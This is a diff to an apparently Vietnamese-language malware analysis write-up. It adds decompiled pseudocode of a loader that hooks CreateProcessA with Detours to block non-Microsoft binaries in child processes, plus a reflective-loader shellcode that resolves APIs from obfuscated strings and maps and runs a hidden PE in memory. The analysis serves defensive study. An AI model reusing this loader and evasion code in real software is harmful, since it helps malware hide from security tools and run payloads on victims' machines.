@@ -823,6 +823,301 @@ void loader()
 hàm này resolve các api cần thiết, lấy path và decrypt `vcruntime141.dll`, ngoài ra còn có hàm `restore_all_loaded_module_text_sections` tự map và ghi đè lại các modules để gỡ hook 
 
 
+```c
+void __fastcall __noreturn loader_0()
+{
+  __int64 v0; // rbp
+  size_t byte_vector_size; // rax
+  HANDLE CurrentThread; // rax
+
+  *(v0 - 80) = lpAddress_1;
+  *(v0 - 72) = get_byte_vector_data((v0 + 128));
+  byte_vector_size = sub_7FFFECD14510((v0 + 128));
+  memcpy(*(v0 - 80), *(v0 - 72), byte_vector_size);
+  DetourTransactionBegin();
+  CurrentThread = GetCurrentThread();
+  DetourUpdateThread(CurrentThread);
+  DetourAttach(&pCreateProcessA, pDetour);
+  DetourTransactionCommit();
+}
+```
+
+phần này là phần tiếp tục của hàm `loader`, có chức năng copy phần code đã decrypt vào phần mem r-w-x, cài Detours hook lên CreateProcessA để mọi lần tạo process sau đó bị ép policy block non-Microsoft binaries và cuối cùng là execute shellcode dã decrypt
+
+<img width="1317" height="455" alt="ảnh" src="https://github.com/user-attachments/assets/edbc699a-b06b-40e7-abe4-9c86c17bb3c7" />
+
+shellcode:
+
+```c
+__int64 shellcode()
+{
+  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]
+
+  v83 = 0LL;
+  VirtualAlloc = 0LL;
+  v122 = 0LL;
+  v82 = 0LL;
+  v117 = NtCurrentPeb();
+  Ldr = v117->Ldr;
+  Flink = Ldr->InMemoryOrderModuleList.Flink;
+  v123 = Flink[5].Flink;
+  Flink_1 = Flink->Flink;
+  v124 = Flink_1[5].Flink;
+  Flink_2 = Flink_1->Flink;
+  v125 = Flink_2[5].Flink;
+  v52 = Flink_2[2].Flink;
+  v119 = v52;
+  v100 = v52 + SHIDWORD(v52[3].Blink);
+  v77 = v100 + 136;
+  v60 = (v52 + *(v100 + 136));
+  v104 = v60[3];
+  m_1 = v60[5];
+  n_1 = v60[6];
+  v78 = v52 + v60[7];
+  v102 = v52 + v60[8];
+  v101 = v52 + v60[9];
+  n87 = 87;
+  n117 = 117;
+  v30 = -124;
+  n96 = 96;
+  v32 = -126;
+  n127 = 127;
+  n115 = 115;
+  n81 = 81;
+  n116 = 116;
+  n116_1 = 116;
+  v38 = -126;
+  n117_1 = 117;
+  v40 = -125;
+  v41 = -125;
+  v42 = 0;
+  for ( i = 0; i < 0xE; ++i )
+    *(&n87 + i) -= 16;                          // GetProcAddress
+  n92 = 92;
+  n127_1 = 127;
+  n113 = 113;
+  n116_2 = 116;
+  n92_1 = 92;
+  n121 = 121;
+  n114 = 114;
+  v12 = -126;
+  n113_1 = 113;
+  v14 = -126;
+  v15 = -119;
+  n81_1 = 81;
+  v17 = 0;
+  for ( j = 0; j < 0xC; ++j )
+    *(&n92 + j) -= 16;                          // LoadLibraryA
+  n102 = 102;
+  n121_1 = 121;
+  v20 = -126;
+  v21 = -124;
+  v22 = -123;
+  qmemcpy(q_Q__, "q|Q||", sizeof(q_Q__));
+  n127_2 = 127;
+  n115_1 = 115;
+  v26 = 0;
+  for ( k = 0; k < 0xC; ++k )
+    *(&n102 + k) -= 16;                         // VirtualAlloc
+  for ( m = 1; m <= m_1; ++m )
+  {
+    for ( n = 0; n < n_1; ++n )
+    {
+      if ( *(v101 + 2LL * n) == m )
+      {
+        v90 = *(v102 + 4LL * n);
+        v3 = v52 + v90;
+        if ( *v3 == n87
+          && v3[1] == n117
+          && v3[2] == v30
+          && v3[3] == n96
+          && v3[4] == v32
+          && v3[5] == n127
+          && v3[6] == n115
+          && v3[7] == n81
+          && v3[8] == n116
+          && v3[9] == n116_1
+          && v3[10] == v38
+          && v3[11] == n117_1
+          && v3[12] == v40
+          && v3[13] == v41 )
+        {
+          v69 = *(v78 + 4LL * m);
+          v83 = (v52 + v69);
+        }
+        if ( *v3 == n92
+          && v3[1] == n127_1
+          && v3[2] == n113
+          && v3[3] == n116_2
+          && v3[4] == n92_1
+          && v3[5] == n121
+          && v3[6] == n114
+          && v3[7] == v12
+          && v3[8] == n113_1
+          && v3[9] == v14
+          && v3[10] == v15
+          && v3[11] == n81_1
+          && v3[12] == v17 )
+        {
+          v70 = *(v78 + 4LL * m);
+          v82 = (v52 + v70);
+        }
+        if ( *v3 == n102
+          && v3[1] == n121_1
+          && v3[2] == v20
+          && v3[3] == v21
+          && v3[4] == v22
+          && v3[5] == q_Q__[0]
+          && v3[6] == q_Q__[1]
+          && v3[7] == q_Q__[2]
+          && v3[8] == q_Q__[3]
+          && v3[9] == q_Q__[4]
+          && v3[10] == n127_2
+          && v3[11] == n115_1
+          && v3[12] == v26 )
+        {
+          v71 = *(v78 + 4LL * m);
+          VirtualAlloc = (v52 + v71);
+        }
+      }
+    }
+  }
+  v54[0] = -24;
+  v54[1] = 0;
+  v54[2] = 0;
+  v54[3] = 0;
+  v54[4] = 0;
+  v54[5] = 88;
+  v54[6] = 88;
+  v54[7] = 80;
+  v54[8] = -61;
+  n4096 = 4096;
+  n0x2000 = 0x2000;
+  flProtect = 64;
+  v91 = (VirtualAlloc)(0LL, 9LL, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+  for ( ii = 0; ii < 9; ++ii )
+    *(v91 + ii) = v54[ii];
+  v56 = v91();
+  v64 = 0LL;
+  for ( jj = 0; jj < &unk_9C4000; ++jj )
+  {
+    if ( *(v56 + jj) == 0x4D
+      && *(v56 + jj + 1) == 90
+      && *(v56 + jj + 2) == 144
+      && !*(v56 + jj + 3)
+      && *(v56 + jj + 4) == 3
+      && !*(v56 + jj + 5) )
+    {
+      v64 = jj + v56;
+      break;
+    }
+  }
+  lpAddress = 0LL;
+  v92 = v64;
+  v75 = *(v64 + 60);
+  v53 = v75 + v64;
+  lpAddress = *(v53 + 48);
+  v27 = 0LL;
+  v27 = (VirtualAlloc)(lpAddress, *(v53 + 80), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+  v61 = 0;
+  if ( !v27 )
+  {
+    v27 = (VirtualAlloc)(0LL, *(v53 + 80), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    v61 = 1;
+  }
+  *(v53 + 48) = v27;
+  for ( kk = 0; kk < *(v53 + 84); ++kk )
+    *(v27 + kk) = *(v64 + kk);
+  v79 = v53 + 264;
+  for ( mm = 0; mm < *(v53 + 6); ++mm )
+  {
+    for ( nn = 0; nn < *(v79 + 40LL * mm + 16); ++nn )
+      *(*(v79 + 40LL * mm + 12) + v27 + nn) = *(*(v79 + 40LL * mm + 20) + v64 + nn);
+  }
+  v103 = v27;
+  v76 = *(v92 + 60);
+  v115 = v76 + v27;
+  v94 = v115;
+  v80 = v115 + 144;
+  i1_1 = *(v115 + 148);
+  v106 = *(v115 + 144);
+  v57 = 0LL;
+  for ( i1 = 0LL; i1 < i1_1; i1 += 20LL )
+  {
+    v57 = (v27 + i1 + v106);
+    if ( !*v57 && !v57[4] )
+      break;
+    v93 = v57[3] + v27;
+    v107 = v57[4];
+    v81 = *v57;
+    if ( !v81 )
+      v81 = v57[4];
+    v84 = 0LL;
+    for ( i2 = 0LL; ; i2 += 8LL )
+    {
+      v68 = (v107 + v84 + v27);
+      v65 = (v81 + i2 + v27);
+      if ( (*v65 & 0x80000000LL) != 0 || *v65 < 0 )
+      {
+        v108 = *v65;
+        v0 = v82(v93);
+        v109 = (v83)(v0, v108);
+        *v68 = v109;
+      }
+      if ( !*v68 )
+        break;
+      if ( *v68 == *v65 )
+      {
+        v110 = *v65 + v27;
+        v111 = v110 + 2;
+        v1 = v82(v93);
+        v112 = (v83)(v1, v111);
+        *v68 = v112;
+      }
+      v84 += 8LL;
+    }
+  }
+  if ( v61 )
+  {
+    v113 = lpAddress;
+    v114 = v27;
+    v116 = v27 - lpAddress;
+    v95 = v94 + 176;
+    v121 = *(v94 + 180);
+    v120 = *(v94 + 176);
+    v58 = (v120 + v27);
+    i3_1 = *(v120 + v27 + 4) - 8;
+    v59 = (v120 + v27 + 8);
+    v87 = v59;
+    v62 = 0;
+    while ( 1 )
+    {
+      ++v62;
+      for ( i3 = 0; i3 < i3_1; i3 += 2 )
+      {
+        v87 = v59;
+        v96 = ((*v59 & 0xFFFu) + *v58 + v27);
+        *v96 += v116;
+        ++v59;
+      }
+      v58 = v59;
+      if ( !*v59 )
+        break;
+      v59 = v58 + 2;
+      i3_1 = v58[1] - 8;
+      v87 = v58 + 2;
+    }
+  }
+  return ((*(v53 + 40) + v27))();
+}
+```
+
+shellcode là một refective loader có chức năng tìm và map file pe lên mem và thực thi lại entrypoint
+
+oep:
+
+<img width="1328" height="451" alt="ảnh" src="https://github.com/user-attachments/assets/62e58b27-c589-40ff-9702-20c22d40486c" />
+
 
 
 
